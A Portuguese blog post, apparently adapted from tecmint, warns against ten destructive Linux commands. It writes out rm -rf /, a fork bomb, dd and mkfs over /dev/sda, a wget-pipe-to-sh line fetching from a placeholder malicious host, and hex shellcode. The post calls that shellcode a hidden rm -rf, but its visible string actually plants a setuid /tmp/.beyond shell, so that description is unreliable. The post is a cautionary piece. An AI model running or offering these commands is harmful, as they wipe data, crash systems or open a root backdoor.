---
layout: post
title: "10 comandos perigosos que você nunca deve executar no GNU/Linux"
date: '2015-06-06T09:49:00.001-07:00'
image: '/assets/img/linux/forkbomb.jpg'
description: "A linha de comando no GNU/Linux é muito produtiva, útil e interessante, no entanto, às vezes pode ser muito perigoso."
tags:
- linux
- gnu
- terminal
- comandos
---

![Fork Bomb](/assets/img/linux/forkbomb.jpg)

A linha de comando no GNU/Linux é muito produtiva, útil e interessante, no entanto, às vezes pode ser muito perigoso, principalmente se tratando do usuário root, ou do usuário que pode assumir a maioria dos seus privilégios, o sudo. É necessário saber exatamente o que está fazendo. Esse artigo serve para alertá-los sobre alguns comandos do terminal, para não executá-los.


# 1. rm -rf

O comando rm -rf é um dos maneira mais rápida de eliminar uma pasta e seu conteúdo. Mas um pouco de erro de digitação ou ignorância pode resultar em danos no sistema irrecuperáveis. Algumas das opções usadas com o comando rm é: 

{% highlight bash %}
rm -rf
{% endhighlight %}

comando rm no Linux é usado para apagar arquivos.

* rm -r comando exclui a pasta de forma recursiva, mesmo a pasta vazia.
* comando rm -f remove "apenas ler o arquivo 'sem perguntar.
* rm-rf / : Força eliminação de tudo no diretório raiz.
* rm -rf * : Força eliminação de tudo no atual diretório diretório / trabalho.
* rm -rf : Força supressão do atual diretórios e subdiretórios.

Por isso, tenha cuidado quando você está executando o comando rm -rf. Para evitar um acidente de excluir arquivos com o comando 'rm', crie um alias de comando 'rm' como 'rm -i' ".bashrc", ele irá pedir-lhe para confirmar cada exclusão.

# 2. :(){:|:&};:

{% highlight bash %}
:(){:|:&};:
{% endhighlight %}

A descrição acima é o fork bomb. Ele opera através da definição de uma função chamada ':', que se chama duas vezes, uma no primeiro plano e uma vez no fundo. Ele mantém em execução novamente e novamente até que o sistema congela.


# 3. comando > /dev/sda

O comando acima escreve a saída do 'comando' no bloco /dev/sda. O comando acima escreve dados brutos e todos os arquivos no bloco serão substituídos por dados brutos, resultando em perda total dos dados no bloco.


# 4. mv diretorio /dev/null

Tudo movido para /dev/null, desaparece do sistema.

{% highlight bash %}
mv /home/user/* /dev/null
{% endhighlight %}

# 5. wget http://malicious_source -O- | sh

O comando acima irá baixar um script a partir de uma fonte mal-intencionada e, em seguida, executá-lo. Comando wget irá baixar o script e sh irá executar o script baixado.

> Nota: Você deve ser muito consciente da fonte de onde você está baixando pacotes e scripts. Só use esses scripts/aplicações que é baixado de uma fonte confiável.

# 6. mkfs.ext3 /dev/sda

{% highlight bash %}
mkfs.ext3 /dev/sda
{% endhighlight %}

O comando acima irá danificar os blocos do seu HD, e formatá-lo.

# 7. > arquivo

{% highlight bash %}
echo "Nada" > arquivo.conf
{% endhighlight %}

Qual arquivo importante do sistema, será substituído com esse redirecionador.

A forma exata de usá-lo é criar um arquivo backup:

{% highlight bash %}
cp arquivo arquivo.bkp
{% endhighlight %}

e redirecionar com 2 "maiores que", >> , se necessário, exemplo para um source.list:

{% highlight bash %}
echo "link pacote deb" >> /etc/apt/source.list
{% endhighlight %}


# 8. ^foo^bar

Este comando é usado para editar o comando anterior sem a necessidade de digitar novamente todo o comando novamente. Mas isso realmente pode ser problemático se você não tomou o risco de verificar cuidadosamente a mudança no comando original usando ^ ^ foo comando bar.


# 9. dd if=/dev/random of=/dev/sda

{% highlight bash %}
dd if=/dev/random of=/dev/sda
{% endhighlight %}

O comando acima irá acabar com como */dev/sda* e escrever dados aleatórios para o bloco. Claro! Seu sistema seria deixado na fase inconsistente e irrecuperável.


# 10. Comando invisível

O comando abaixo nada mais é que o primeiro comando deste artigo (rm-rf). Aqui os códigos estão escondidos em hex para que um usuário ignorante pode ser enganado. Executando o código abaixo em seu terminal e limpar sua partição raiz.

Este comando aqui mostra que a ameaça pode ser escondida e normalmente não detectável, às vezes. Você deve estar ciente de que você está fazendo e qual seria o resultado. Não compilar/rodar códigos a partir de uma fonte desconhecida.


{% highlight bash %}
 char esp[] __attribute__ ((section(“.text”))) /* e.s.p
 release */
 = “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68″
 “\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″
 “\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″
 “\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56″
 “\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″
 “\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″
 “\x6e\x2f\x73\x68\x00\x2d\x63\x00″
 “cp -p /bin/sh /tmp/.beyond; chmod 4755
 /tmp/.beyond;”;
{% endhighlight %}

Veja um vídeo bem legal onde resume os 5 mais perigosos

# [Clique Aqui para Ver o Vídeo](https://www.youtube.com/watch?v=-mDqHdIOjJM)


## NÃO EXECUTE NENHUM COMANDO ACIMA, CASO QUEIRA TESTÁ-LOS, UTILIZE UM A MÁQUINA VIRTUAL PARA TESTES

<sub>Via: http://www.tecmint.com/10-most-dangerous-commands-you-should-never-execute-on-linux/</sub>

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>

<!-- Informat -->
<ins class="adsbygoogle"
 style="display:block"
 data-ad-client="ca-pub-2838251107855362"
 data-ad-slot="2327980059"
 data-ad-format="auto"
 data-full-width-responsive="true"></ins>

<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

